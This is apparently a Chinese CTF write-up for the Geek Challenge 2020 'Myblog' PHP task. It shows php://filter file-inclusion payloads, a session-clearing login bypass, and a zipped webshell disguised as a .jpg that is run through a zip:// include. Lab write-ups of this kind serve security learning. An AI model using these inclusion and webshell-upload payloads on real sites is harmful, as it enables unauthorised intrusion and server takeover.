---
title: '[极客大挑战 2020]Roamphp2-Myblog'
date: 2024-11-05 15:27:54
tags: zip伪协议
categories: 刷题笔记
---

## [极客大挑战 2020]Roamphp2-Myblog

我们注意到到我们点击链接时，url的page的值都会随着改变，我们猜测这里存在文件包含

我们用伪协议读取看看

```
?page=php://filter/read=convert.base64-encode/resource=login.php
```

![image-20241105154543416](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051545496.png)

啥都没有，我们观察url的page传的值都是没有后缀的，我们把php后缀删掉

```
?page=php://filter/read=convert.base64-encode/resource=login.php
```

发现了base64，我们进行解码

```php
<?php
require_once("secret.php");
mt_srand($secret_seed);
$_SESSION['password'] = mt_rand();
?>
 密码是个随机值
```

同样的操作我们查看home，secret，

home.php 就一些html代码，没啥看的

secret.php

```php
<?php
$secret_seed = mt_rand();
?>
```

emmm，没找到啥有用的，我们到login页面看看

我们发现了个admin/user页面

![image-20241105155759039](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051557079.png)

我们查看一下

![image-20241105155821720](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051558750.png)

提示我们用户名或密码不正确

那我们直接查看源码，把html源码省略了

```php
<?php
error_reporting(0);
session_start();
$logined = false;
if (isset($_POST['username']) and isset($_POST['password'])){
	if ($_POST['username'] === "Longlone" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself
		$logined = true;
		$_SESSION['status'] = $logined;
	}
}
if ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){
    echo "<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>";
	die();
}
?>
```

```php
<?php
		if(isset($_FILES['Files']) and $_SESSION['status'] === true){
			$tmp_file = $_FILES['Files']['name'];
			$tmp_path = $_FILES['Files']['tmp_name'];
			if(($extension = pathinfo($tmp_file)['extension']) != ""){
				$allows = array('gif','jpeg','jpg','png');
				if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
						$upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
						move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
						echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
				} else {
					echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
				}
			}
		}
	  ?>
```

我们注意到password使用session里的password里面找[(13条消息) php之$_SESSION的理解_勤于总结，学会分享-CSDN博客](https://blog.csdn.net/zhengxijia2012/article/details/73437376)

如果我们把session全删了之后，那么传进去的密码就不会是Longlone的密码了，没有cookie就找不到是哪个用户，那服务端存档

$_SESSION['password'])也就为空了，那我们只需要也传一个空密码按道理就可以绕过了。

```
if ($_POST['username'] === "Longlone" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself
```

但当我们把cookie删掉后，直接登录优惠提示必须填写密码

![image-20241105160712696](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051607737.png)

我们猜测前端把密码设置为了必填项

我们删了就行

![image-20241105160812578](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051608611.png)

然后我们成功进入了admin/user界面

![image-20241105160923657](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051609727.png)

接着我们查看上传文件的代码

```php
  <?php
		if(isset($_FILES['Files']) and $_SESSION['status'] === true){
			$tmp_file = $_FILES['Files']['name'];
			$tmp_path = $_FILES['Files']['tmp_name'];
			if(($extension = pathinfo($tmp_file)['extension']) != ""){
				$allows = array('gif','jpeg','jpg','png');
				if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
						$upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
						move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
						echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
				} else {
					echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
				}
			}
		}
	  ?>
```

我们可以看到，代码设置了白名单，我们可以传一句话木马上去，而且成功的话他会告诉我们上传的路径，然后再用之前的page参数解析伪协议，那我们怎么上传呢

我们想到可以利用将php文件打包成zip，然后改后缀为jpg，然后用zip伪协议进行读取。zip协议可以解压jpg后缀的压缩包的

我们开始构造：

![image-20241105162140067](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051621144.png)

上传成功

![image-20241105162324817](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051623856.png)

```python
Update image -> assets/img/upload/79b117c154c02c073f75af99a60e5a8f92c1bbfe.jpg
```

我们用zip伪协议读取一下

> zip:// + zip路径 + %23 + php文件名 (由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23)
>
> 这里不加.php后缀是因为在index.php包含的时候默认加上了，还要注意zip协议后面跟的是./因为没有去看绝对路径。
>
> ![image-20241105163925480](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051639525.png)

```html
?page=zip://./assets/img/upload/79b117c154c02c073f75af99a60e5a8f92c1bbfe.jpg%2312
```

我们用蚁剑进行连接

得到flag

![image-20241105164000874](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051640907.png)

如果蚁剑连不上，可以post传参进行命令执行
